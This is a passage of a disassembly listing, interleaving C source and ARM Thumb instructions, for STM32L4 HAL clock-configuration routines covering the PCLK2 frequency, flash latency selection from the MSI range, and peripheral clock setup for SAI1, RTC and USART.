  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 8004610:	f7ff ffda 	bl	80045c8 <HAL_RCC_GetHCLKFreq>
 8004614:	4602      	mov	r2, r0
 8004616:	4b06      	ldr	r3, [pc, #24]	; (8004630 <HAL_RCC_GetPCLK2Freq+0x24>)
 8004618:	689b      	ldr	r3, [r3, #8]
 800461a:	0adb      	lsrs	r3, r3, #11
 800461c:	f003 0307 	and.w	r3, r3, #7
 8004620:	4904      	ldr	r1, [pc, #16]	; (8004634 <HAL_RCC_GetPCLK2Freq+0x28>)
 8004622:	5ccb      	ldrb	r3, [r1, r3]
 8004624:	f003 031f 	and.w	r3, r3, #31
 8004628:	fa22 f303 	lsr.w	r3, r2, r3
}
 800462c:	4618      	mov	r0, r3
 800462e:	bd80      	pop	{r7, pc}
 8004630:	40021000 	.word	0x40021000
 8004634:	0800d410 	.word	0x0800d410

08004638 <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 8004638:	b580      	push	{r7, lr}
 800463a:	b086      	sub	sp, #24
 800463c:	af00      	add	r7, sp, #0
 800463e:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 8004640:	2300      	movs	r3, #0
 8004642:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 8004644:	4b2a      	ldr	r3, [pc, #168]	; (80046f0 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004646:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004648:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800464c:	2b00      	cmp	r3, #0
 800464e:	d003      	beq.n	8004658 <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 8004650:	f7ff f9a6 	bl	80039a0 <HAL_PWREx_GetVoltageRange>
 8004654:	6178      	str	r0, [r7, #20]
 8004656:	e014      	b.n	8004682 <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 8004658:	4b25      	ldr	r3, [pc, #148]	; (80046f0 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800465a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800465c:	4a24      	ldr	r2, [pc, #144]	; (80046f0 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800465e:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8004662:	6593      	str	r3, [r2, #88]	; 0x58
 8004664:	4b22      	ldr	r3, [pc, #136]	; (80046f0 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004666:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004668:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800466c:	60fb      	str	r3, [r7, #12]
 800466e:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 8004670:	f7ff f996 	bl	80039a0 <HAL_PWREx_GetVoltageRange>
 8004674:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 8004676:	4b1e      	ldr	r3, [pc, #120]	; (80046f0 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004678:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800467a:	4a1d      	ldr	r2, [pc, #116]	; (80046f0 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800467c:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004680:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 8004682:	697b      	ldr	r3, [r7, #20]
 8004684:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8004688:	d10b      	bne.n	80046a2 <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 800468a:	687b      	ldr	r3, [r7, #4]
 800468c:	2b80      	cmp	r3, #128	; 0x80
 800468e:	d919      	bls.n	80046c4 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 8004690:	687b      	ldr	r3, [r7, #4]
 8004692:	2ba0      	cmp	r3, #160	; 0xa0
 8004694:	d902      	bls.n	800469c <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 8004696:	2302      	movs	r3, #2
 8004698:	613b      	str	r3, [r7, #16]
 800469a:	e013      	b.n	80046c4 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 800469c:	2301      	movs	r3, #1
 800469e:	613b      	str	r3, [r7, #16]
 80046a0:	e010      	b.n	80046c4 <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 80046a2:	687b      	ldr	r3, [r7, #4]
 80046a4:	2b80      	cmp	r3, #128	; 0x80
 80046a6:	d902      	bls.n	80046ae <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 80046a8:	2303      	movs	r3, #3
 80046aa:	613b      	str	r3, [r7, #16]
 80046ac:	e00a      	b.n	80046c4 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 80046ae:	687b      	ldr	r3, [r7, #4]
 80046b0:	2b80      	cmp	r3, #128	; 0x80
 80046b2:	d102      	bne.n	80046ba <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 80046b4:	2302      	movs	r3, #2
 80046b6:	613b      	str	r3, [r7, #16]
 80046b8:	e004      	b.n	80046c4 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 80046ba:	687b      	ldr	r3, [r7, #4]
 80046bc:	2b70      	cmp	r3, #112	; 0x70
 80046be:	d101      	bne.n	80046c4 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 80046c0:	2301      	movs	r3, #1
 80046c2:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 80046c4:	4b0b      	ldr	r3, [pc, #44]	; (80046f4 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80046c6:	681b      	ldr	r3, [r3, #0]
 80046c8:	f023 0207 	bic.w	r2, r3, #7
 80046cc:	4909      	ldr	r1, [pc, #36]	; (80046f4 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80046ce:	693b      	ldr	r3, [r7, #16]
 80046d0:	4313      	orrs	r3, r2
 80046d2:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 80046d4:	4b07      	ldr	r3, [pc, #28]	; (80046f4 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 80046d6:	681b      	ldr	r3, [r3, #0]
 80046d8:	f003 0307 	and.w	r3, r3, #7
 80046dc:	693a      	ldr	r2, [r7, #16]
 80046de:	429a      	cmp	r2, r3
 80046e0:	d001      	beq.n	80046e6 <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 80046e2:	2301      	movs	r3, #1
 80046e4:	e000      	b.n	80046e8 <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 80046e6:	2300      	movs	r3, #0
}
 80046e8:	4618      	mov	r0, r3
 80046ea:	3718      	adds	r7, #24
 80046ec:	46bd      	mov	sp, r7
 80046ee:	bd80      	pop	{r7, pc}
 80046f0:	40021000 	.word	0x40021000
 80046f4:	40022000 	.word	0x40022000

080046f8 <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 80046f8:	b580      	push	{r7, lr}
 80046fa:	b086      	sub	sp, #24
 80046fc:	af00      	add	r7, sp, #0
 80046fe:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 8004700:	2300      	movs	r3, #0
 8004702:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 8004704:	2300      	movs	r3, #0
 8004706:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 8004708:	687b      	ldr	r3, [r7, #4]
 800470a:	681b      	ldr	r3, [r3, #0]
 800470c:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8004710:	2b00      	cmp	r3, #0
 8004712:	d031      	beq.n	8004778 <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 8004714:	687b      	ldr	r3, [r7, #4]
 8004716:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004718:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 800471c:	d01a      	beq.n	8004754 <HAL_RCCEx_PeriphCLKConfig+0x5c>
 800471e:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 8004722:	d814      	bhi.n	800474e <HAL_RCCEx_PeriphCLKConfig+0x56>
 8004724:	2b00      	cmp	r3, #0
 8004726:	d009      	beq.n	800473c <HAL_RCCEx_PeriphCLKConfig+0x44>
 8004728:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 800472c:	d10f      	bne.n	800474e <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 800472e:	4b5d      	ldr	r3, [pc, #372]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004730:	68db      	ldr	r3, [r3, #12]
 8004732:	4a5c      	ldr	r2, [pc, #368]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004734:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8004738:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 800473a:	e00c      	b.n	8004756 <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 800473c:	687b      	ldr	r3, [r7, #4]
 800473e:	3304      	adds	r3, #4
 8004740:	2100      	movs	r1, #0
 8004742:	4618      	mov	r0, r3
 8004744:	f000 f9de 	bl	8004b04 <RCCEx_PLLSAI1_Config>
 8004748:	4603      	mov	r3, r0
 800474a:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 800474c:	e003      	b.n	8004756 <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 800474e:	2301      	movs	r3, #1
 8004750:	74fb      	strb	r3, [r7, #19]
      break;
 8004752:	e000      	b.n	8004756 <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 8004754:	bf00      	nop
    }

    if(ret == HAL_OK)
 8004756:	7cfb      	ldrb	r3, [r7, #19]
 8004758:	2b00      	cmp	r3, #0
 800475a:	d10b      	bne.n	8004774 <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 800475c:	4b51      	ldr	r3, [pc, #324]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800475e:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004762:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 8004766:	687b      	ldr	r3, [r7, #4]
 8004768:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 800476a:	494e      	ldr	r1, [pc, #312]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800476c:	4313      	orrs	r3, r2
 800476e:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 8004772:	e001      	b.n	8004778 <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 8004774:	7cfb      	ldrb	r3, [r7, #19]
 8004776:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 8004778:	687b      	ldr	r3, [r7, #4]
 800477a:	681b      	ldr	r3, [r3, #0]
 800477c:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004780:	2b00      	cmp	r3, #0
 8004782:	f000 809e 	beq.w	80048c2 <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 8004786:	2300      	movs	r3, #0
 8004788:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 800478a:	4b46      	ldr	r3, [pc, #280]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800478c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800478e:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004792:	2b00      	cmp	r3, #0
 8004794:	d101      	bne.n	800479a <HAL_RCCEx_PeriphCLKConfig+0xa2>
 8004796:	2301      	movs	r3, #1
 8004798:	e000      	b.n	800479c <HAL_RCCEx_PeriphCLKConfig+0xa4>
 800479a:	2300      	movs	r3, #0
 800479c:	2b00      	cmp	r3, #0
 800479e:	d00d      	beq.n	80047bc <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 80047a0:	4b40      	ldr	r3, [pc, #256]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047a2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80047a4:	4a3f      	ldr	r2, [pc, #252]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047a6:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80047aa:	6593      	str	r3, [r2, #88]	; 0x58
 80047ac:	4b3d      	ldr	r3, [pc, #244]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047ae:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80047b0:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80047b4:	60bb      	str	r3, [r7, #8]
 80047b6:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 80047b8:	2301      	movs	r3, #1
 80047ba:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80047bc:	4b3a      	ldr	r3, [pc, #232]	; (80048a8 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80047be:	681b      	ldr	r3, [r3, #0]
 80047c0:	4a39      	ldr	r2, [pc, #228]	; (80048a8 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80047c2:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 80047c6:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 80047c8:	f7fc fdda 	bl	8001380 <HAL_GetTick>
 80047cc:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80047ce:	e009      	b.n	80047e4 <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 80047d0:	f7fc fdd6 	bl	8001380 <HAL_GetTick>
 80047d4:	4602      	mov	r2, r0
 80047d6:	68fb      	ldr	r3, [r7, #12]
 80047d8:	1ad3      	subs	r3, r2, r3
 80047da:	2b02      	cmp	r3, #2
 80047dc:	d902      	bls.n	80047e4 <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 80047de:	2303      	movs	r3, #3
 80047e0:	74fb      	strb	r3, [r7, #19]
        break;
 80047e2:	e005      	b.n	80047f0 <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80047e4:	4b30      	ldr	r3, [pc, #192]	; (80048a8 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80047e6:	681b      	ldr	r3, [r3, #0]
 80047e8:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80047ec:	2b00      	cmp	r3, #0
 80047ee:	d0ef      	beq.n	80047d0 <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 80047f0:	7cfb      	ldrb	r3, [r7, #19]
 80047f2:	2b00      	cmp	r3, #0
 80047f4:	d15a      	bne.n	80048ac <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 80047f6:	4b2b      	ldr	r3, [pc, #172]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047f8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80047fc:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004800:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 8004802:	697b      	ldr	r3, [r7, #20]
 8004804:	2b00      	cmp	r3, #0
 8004806:	d01e      	beq.n	8004846 <HAL_RCCEx_PeriphCLKConfig+0x14e>
 8004808:	687b      	ldr	r3, [r7, #4]
 800480a:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 800480c:	697a      	ldr	r2, [r7, #20]
 800480e:	429a      	cmp	r2, r3
 8004810:	d019      	beq.n	8004846 <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 8004812:	4b24      	ldr	r3, [pc, #144]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004814:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004818:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 800481c:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 800481e:	4b21      	ldr	r3, [pc, #132]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004820:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004824:	4a1f      	ldr	r2, [pc, #124]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004826:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800482a:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 800482e:	4b1d      	ldr	r3, [pc, #116]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004830:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004834:	4a1b      	ldr	r2, [pc, #108]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004836:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 800483a:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 800483e:	4a19      	ldr	r2, [pc, #100]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004840:	697b      	ldr	r3, [r7, #20]
 8004842:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 8004846:	697b      	ldr	r3, [r7, #20]
 8004848:	f003 0301 	and.w	r3, r3, #1
 800484c:	2b00      	cmp	r3, #0
 800484e:	d016      	beq.n	800487e <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8004850:	f7fc fd96 	bl	8001380 <HAL_GetTick>
 8004854:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004856:	e00b      	b.n	8004870 <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8004858:	f7fc fd92 	bl	8001380 <HAL_GetTick>
 800485c:	4602      	mov	r2, r0
 800485e:	68fb      	ldr	r3, [r7, #12]
 8004860:	1ad3      	subs	r3, r2, r3
 8004862:	f241 3288 	movw	r2, #5000	; 0x1388
 8004866:	4293      	cmp	r3, r2
 8004868:	d902      	bls.n	8004870 <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 800486a:	2303      	movs	r3, #3
 800486c:	74fb      	strb	r3, [r7, #19]
            break;
 800486e:	e006      	b.n	800487e <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004870:	4b0c      	ldr	r3, [pc, #48]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004872:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004876:	f003 0302 	and.w	r3, r3, #2
 800487a:	2b00      	cmp	r3, #0
 800487c:	d0ec      	beq.n	8004858 <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 800487e:	7cfb      	ldrb	r3, [r7, #19]
 8004880:	2b00      	cmp	r3, #0
 8004882:	d10b      	bne.n	800489c <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 8004884:	4b07      	ldr	r3, [pc, #28]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004886:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800488a:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 800488e:	687b      	ldr	r3, [r7, #4]
 8004890:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004892:	4904      	ldr	r1, [pc, #16]	; (80048a4 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004894:	4313      	orrs	r3, r2
 8004896:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 800489a:	e009      	b.n	80048b0 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 800489c:	7cfb      	ldrb	r3, [r7, #19]
 800489e:	74bb      	strb	r3, [r7, #18]
 80048a0:	e006      	b.n	80048b0 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 80048a2:	bf00      	nop
 80048a4:	40021000 	.word	0x40021000
 80048a8:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 80048ac:	7cfb      	ldrb	r3, [r7, #19]
 80048ae:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 80048b0:	7c7b      	ldrb	r3, [r7, #17]
 80048b2:	2b01      	cmp	r3, #1
 80048b4:	d105      	bne.n	80048c2 <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 80048b6:	4b8a      	ldr	r3, [pc, #552]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048b8:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80048ba:	4a89      	ldr	r2, [pc, #548]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048bc:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80048c0:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 80048c2:	687b      	ldr	r3, [r7, #4]
 80048c4:	681b      	ldr	r3, [r3, #0]
 80048c6:	f003 0301 	and.w	r3, r3, #1
 80048ca:	2b00      	cmp	r3, #0
 80048cc:	d00a      	beq.n	80048e4 <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 80048ce:	4b84      	ldr	r3, [pc, #528]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048d0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048d4:	f023 0203 	bic.w	r2, r3, #3
 80048d8:	687b      	ldr	r3, [r7, #4]
 80048da:	6a1b      	ldr	r3, [r3, #32]
 80048dc:	4980      	ldr	r1, [pc, #512]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048de:	4313      	orrs	r3, r2
 80048e0:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 80048e4:	687b      	ldr	r3, [r7, #4]
 80048e6:	681b      	ldr	r3, [r3, #0]
 80048e8:	f003 0302 	and.w	r3, r3, #2
 80048ec:	2b00      	cmp	r3, #0
 80048ee:	d00a      	beq.n	8004906 <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 80048f0:	4b7b      	ldr	r3, [pc, #492]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048f2:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048f6:	f023 020c 	bic.w	r2, r3, #12
 80048fa:	687b      	ldr	r3, [r7, #4]
 80048fc:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80048fe:	4978      	ldr	r1, [pc, #480]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004900:	4313      	orrs	r3, r2
 8004902:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 8004906:	687b      	ldr	r3, [r7, #4]
 8004908:	681b      	ldr	r3, [r3, #0]
 800490a:	f003 0320 	and.w	r3, r3, #32
 800490e:	2b00      	cmp	r3, #0
 8004910:	d00a      	beq.n	8004928 <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
